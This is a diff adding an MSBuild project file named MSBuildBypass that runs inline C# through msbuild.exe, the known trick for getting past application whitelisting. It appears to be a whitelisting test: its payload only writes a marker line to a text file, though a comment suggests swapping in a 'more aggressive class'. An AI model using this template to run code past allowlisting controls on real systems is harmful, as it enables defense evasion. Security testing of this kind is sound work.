@@ -1,0 +1,39 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
+  <!-- Feel free to use a more aggressive class for testing. -->
+  <Target Name="Hello">
+   <ClassExample/>
+  </Target>
+	<UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	<!-- <Reference Include="System.IO" /> Example Include -->
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.IO;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			public class ClassExample :  Task, ITask
+			{
+				public override bool Execute()
+				{
+					Console.WriteLine("Hello From a Class.");
+					string path = "../WLtester.txt";
+					using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew)) {
+						using (StreamWriter stream = new StreamWriter(file)) {
+							stream.WriteLine("MSBuildBypass.");
+						}
+					}
+					return true;				
+				}
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
